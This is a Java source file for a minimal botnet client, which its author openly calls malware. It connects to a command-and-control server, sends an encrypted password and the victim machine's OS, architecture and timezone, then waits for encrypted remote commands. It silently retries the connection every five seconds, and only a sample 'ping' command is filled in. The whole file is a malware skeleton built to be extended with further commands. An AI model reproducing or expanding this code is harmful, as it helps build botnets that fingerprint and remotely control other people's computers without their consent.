package me.aaronakhtar.jbot;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.util.Locale;
import java.util.TimeZone;

public class Main {         // lets make this as minimal as possible. No dependencies, Just as small as possible.

    private static final String host = "127.0.0.1"; // change to your cnc host
    private static final int    bot_port = 120; //change to your bot port

    private static final String
            encryptionKey = "jBotEncryptionKey",
            password = "A4r0nAkht4r";


    private static boolean isSocketAlive(Socket socket){
        try{
            socket.getOutputStream().write(0);
            return true;
        }catch (Exception e){
            return false;
        }
    }

    public static void main(String[] args) {


        while(true){
            try {

                try(Socket socket = new Socket(host, bot_port);
                    BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()))){
                    //os#arch#timezone
                    writer.write(Aes.encrypt(password, encryptionKey) + "\n");
                    writer.write(Aes.encrypt(System.getProperty("os.name") + "#"+System.getProperty("os.arch")+"#" + TimeZone.getDefault().getID(), encryptionKey) + "\n");
                    writer.flush();
                    Thread.sleep(1200);
                    while(isSocketAlive(socket)){
                        String command;
                        try {
                            if ((command = reader.readLine()) != null && (command = Aes.decrypt(command, encryptionKey)) != null) {
                                final String[] commandArgs = command.split(" ");

                                // WE ARE USING SWITCH OVER REFLECTIONS AS I WANT THE MALWARE TO BE AS LIGHTWEIGHT AS POSSSSSIBLE.
                                switch (commandArgs[0].toLowerCase(Locale.ROOT)){

                                    // example

                                    case "ping":{
                                        System.out.println("pong");
                                        break;
                                    }

                                }


                            }
                        }catch (Exception e){

                        }
                    }



                }

            }catch (Exception e){

            }finally {
                try{
                    Thread.sleep(5000); // try to reconnect every 5 seconds if cannot connect
                }catch (Exception e){

                }
            }


        }

    }

}
